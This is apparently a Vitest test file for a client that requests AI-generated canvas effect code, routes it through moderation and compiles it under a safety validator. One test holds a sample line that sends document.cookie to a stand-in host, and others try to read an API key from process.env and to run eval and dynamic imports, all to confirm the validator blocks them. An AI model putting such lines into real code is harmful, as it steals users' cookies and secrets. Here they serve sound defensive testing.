import { afterEach, describe, expect, it, vi } from "vitest";

import {
  buildEffectModerationActionUrl,
  clearApprovedEffectsCache,
  EffectIdeaApiError,
  compileRuntimeEffect,
  fetchPendingEffect,
  fetchPendingEffects,
  fetchApprovedEffects,
  generateEffectIdea,
  improveEffectGenerationPromptTemplate,
  submitEffectIdea,
  validateGeneratedRuntimeCode
} from "./effectIdeas";

describe("effect ideas client", () => {
  const originalFetch = globalThis.fetch;

  afterEach(() => {
    globalThis.fetch = originalFetch;
    vi.restoreAllMocks();
    clearApprovedEffectsCache();
  });

  it("generates effect code from the API", async () => {
    globalThis.fetch = vi.fn(async () => ({
      ok: true,
      status: 200,
      json: async () => ({
        generation: {
          name: "Nebula Pulse",
          typescriptCode: "export const name='Nebula Pulse';",
          runtimeCode: "return { render() {} };",
          params: [{ key: "speed", label: "Speed", type: "number", defaultValue: 1 }],
          docs: { description: "Generated effect", parameters: "- speed: speed." }
        }
      })
    })) as typeof fetch;

    await expect(generateEffectIdea("nebula pulses")).resolves.toEqual({
      name: "Nebula Pulse",
      typescriptCode: "export const name='Nebula Pulse';",
      runtimeCode: "return { render() {} };",
      params: [{ key: "speed", label: "Speed", type: "number", defaultValue: 1 }],
      docs: { description: "Generated effect", parameters: "- speed: speed." }
    });
    expect(globalThis.fetch).toHaveBeenCalledWith(
      "/api/effects?action=generate",
      expect.objectContaining({
        method: "POST",
        body: JSON.stringify({ prompt: "nebula pulses", improvementAttempt: 0 })
      })
    );
  });

  it("submits effect ideas for moderation", async () => {
    globalThis.fetch = vi.fn(async () => ({ ok: true, status: 200, json: async () => ({ moderationStatus: "pending" }) })) as typeof fetch;

    await expect(
      submitEffectIdea({
        name: "Tunnel",
        prompt: "A tunnel",
        typescriptCode: "ts",
        runtimeCode: "return { render() {} };"
      })
    ).resolves.toBeUndefined();
  });

  it("sends improvement attempt metadata for self-improvement retries", async () => {
    globalThis.fetch = vi.fn(async () => ({
      ok: true,
      status: 200,
      json: async () => ({
        generation: {
          name: "Retry Nebula",
          typescriptCode: "ts",
          runtimeCode: "return { render() {} };"
        }
      })
    })) as typeof fetch;

    await generateEffectIdea("retry me", { improvementAttempt: 3 });
    expect(globalThis.fetch).toHaveBeenCalledWith(
      "/api/effects?action=generate",
      expect.objectContaining({
        body: JSON.stringify({ prompt: "retry me", improvementAttempt: 3 })
      })
    );
  });

  it("submits prompt-improvement payloads after failures", async () => {
    globalThis.fetch = vi.fn(async () => ({
      ok: true,
      status: 200,
      json: async () => ({ promptTemplate: { version: 2 } })
    })) as typeof fetch;

    await improveEffectGenerationPromptTemplate({
      userPrompt: "retro tunnel",
      response: "not-json",
      error: "Unable to parse generated effect response.",
      improvementAttempt: 2,
      failureHistory: [{ promptSent: "retro tunnel", response: "not-json", error: "Unable to parse generated effect response." }]
    });

    expect(globalThis.fetch).toHaveBeenCalledWith(
      "/api/effects?action=improvePromptTemplate",
      expect.objectContaining({
        method: "POST",
        body: JSON.stringify({
          userPrompt: "retro tunnel",
          response: "not-json",
          error: "Unable to parse generated effect response.",
          improvementAttempt: 2,
          failureHistory: [{ promptSent: "retro tunnel", response: "not-json", error: "Unable to parse generated effect response." }]
        })
      })
    );
  });

  it("caches approved effects", async () => {
    globalThis.fetch = vi.fn(async () => ({
      ok: true,
      status: 200,
      json: async () => ({ effects: [{ id: "1", name: "One", prompt: "p", typescriptCode: "ts", runtimeCode: "return { render() {} };", createdAt: 1 }] })
    })) as typeof fetch;

    await expect(fetchApprovedEffects()).resolves.toHaveLength(1);
    await expect(fetchApprovedEffects()).resolves.toHaveLength(1);
    expect(globalThis.fetch).toHaveBeenCalledTimes(1);
  });

  it("fetches a pending effect for the review page", async () => {
    globalThis.fetch = vi.fn(async () => ({
      ok: true,
      status: 200,
      json: async () => ({
        effect: { id: "pending-2", name: "Tunnel", prompt: "Fast", typescriptCode: "ts", runtimeCode: "return { render() {} };", createdAt: 3 },
        reviewUrl: "/effect-review.html?id=pending-2&token=secret-token"
      })
    })) as typeof fetch;

    await expect(fetchPendingEffect("pending-2", "secret-token")).resolves.toEqual({
      effect: { id: "pending-2", name: "Tunnel", prompt: "Fast", typescriptCode: "ts", runtimeCode: "return { render() {} };", createdAt: 3 },
      reviewUrl: "/effect-review.html?id=pending-2&token=secret-token"
    });
    expect(globalThis.fetch).toHaveBeenCalledWith(
      "/api/effects?pendingId=pending-2&token=secret-token",
      expect.objectContaining({ method: "GET" })
    );
  });

  it("accepts pending effects even when optional metadata is malformed", async () => {
    globalThis.fetch = vi.fn(async () => ({
      ok: true,
      status: 200,
      json: async () => ({
        effect: {
          id: "pending-legacy",
          name: "Legacy",
          prompt: "Legacy prompt",
          typescriptCode: "ts",
          runtimeCode: "return { render() {} };",
          params: "bad-shape",
          docs: null,
          createdAt: 5
        }
      })
    })) as typeof fetch;

    const result = await fetchPendingEffect("pending-legacy", "secret-token");
    expect(result.reviewUrl).toBeNull();
    expect(result.effect).not.toBeNull();
    expect(result.effect?.id).toBe("pending-legacy");
  });

  it("fetches pending effects queue for next-item moderation", async () => {
    globalThis.fetch = vi.fn(async () => ({
      ok: true,
      status: 200,
      json: async () => ({
        effects: [],
        pendingEffects: [
          { id: "pending-1", name: "One", prompt: "p", typescriptCode: "ts", runtimeCode: "return { render() {} };", createdAt: 1 },
          { id: "pending-2", name: "Two", prompt: "p", typescriptCode: "ts", runtimeCode: "return { render() {} };", createdAt: 2 }
        ]
      })
    })) as typeof fetch;

    await expect(fetchPendingEffects("secret-token")).resolves.toEqual([
      { id: "pending-1", name: "One", prompt: "p", typescriptCode: "ts", runtimeCode: "return { render() {} };", createdAt: 1 },
      { id: "pending-2", name: "Two", prompt: "p", typescriptCode: "ts", runtimeCode: "return { render() {} };", createdAt: 2 }
    ]);
    expect(globalThis.fetch).toHaveBeenCalledWith(
      "/api/effects?includePending=1&token=secret-token",
      expect.objectContaining({ method: "GET" })
    );
  });

  it("builds moderation action URLs for effect review buttons", () => {
    expect(buildEffectModerationActionUrl("approve", "pending-3", "secret token")).toBe(
      "/api/effects?action=approve&id=pending-3&token=secret+token"
    );
    expect(buildEffectModerationActionUrl("reject", "pending-3", "secret token")).toBe(
      "/api/effects?action=reject&id=pending-3&token=secret+token"
    );
  });

  it("compiles runtime effects", () => {
    const effect = compileRuntimeEffect("return { render() { return; } };");
    expect(typeof effect.render).toBe("function");
  });

  it("compiles module-style generated code with export default factory", () => {
    const effect = compileRuntimeEffect(`
      type Demo = { render: (context: CanvasRenderingContext2D) => void; reset?: () => void; };
      export default function createDemo(): Demo {
        return {
          render(context: CanvasRenderingContext2D) {
            context.fillRect(0, 0, context.canvas.width, context.canvas.height);
          },
          reset() {}
        };
      }
    `);
    expect(typeof effect.render).toBe("function");
    expect(typeof effect.reset).toBe("function");
  });

  it("compiles runtime code delivered with escaped newlines", () => {
    const effect = compileRuntimeEffect("return {\\n  render(context) {\\n    context.ctx.fillRect(0, 0, context.width, context.height);\\n  },\\n  reset() {}\\n};");
    expect(typeof effect.render).toBe("function");
    expect(typeof effect.reset).toBe("function");
  });

  it("rejects runtime code that attempts data exfiltration", () => {
    expect(() => validateGeneratedRuntimeCode("return { render() { fetch('https://evil.invalid/leak', { method: 'POST', body: document.cookie }); } };"))
      .toThrow("Generated runtime code blocked by safety policy");
  });

  it("rejects runtime code that reads process environment variables", () => {
    expect(() => compileRuntimeEffect("return { render() { console.log(process.env.OPENAI_API_KEY); } };"))
      .toThrow("Generated runtime code blocked by safety policy");
  });

  it("allows comments and strings that mention blocked primitives", () => {
    expect(() => compileRuntimeEffect(`
      // Avoid eval() and new Function() in this effect.
      return {
        render() {
          const note = "Never call import('x') from generated effects.";
          void note;
        }
      };
    `)).not.toThrow();
  });

  it("rejects dynamic code execution helpers", () => {
    expect(() => validateGeneratedRuntimeCode(`
      const factory = new Function("return 6 * 7;");
      const imported = import("./optional-effect-helper.js");
      const maybeRequired = require("./optional-effect-helper");
      const value = eval("factory()");
      void imported;
      void maybeRequired;
      void value;
    `)).toThrow("dynamic_code_exec");
  });

  it("surfaces API error messages for generation failures", async () => {
    globalThis.fetch = vi.fn(async () => ({
      ok: false,
      status: 503,
      json: async () => ({ error: "OPENAI_API_KEY is not configured." })
    })) as typeof fetch;

    await expect(generateEffectIdea("test")).rejects.toThrow("OPENAI_API_KEY is not configured.");
  });

  it("preserves raw model responses on API failures", async () => {
    globalThis.fetch = vi.fn(async () => ({
      ok: false,
      status: 503,
      json: async () => ({
        error: "Unable to parse generated effect response.",
        rawResponse: "Sure! Here is a markdown explanation first..."
      })
    })) as typeof fetch;

    await expect(generateEffectIdea("test")).rejects.toMatchObject({
      name: "EffectIdeaApiError",
      rawResponse: "Sure! Here is a markdown explanation first..."
    } satisfies Partial<EffectIdeaApiError>);
  });
});
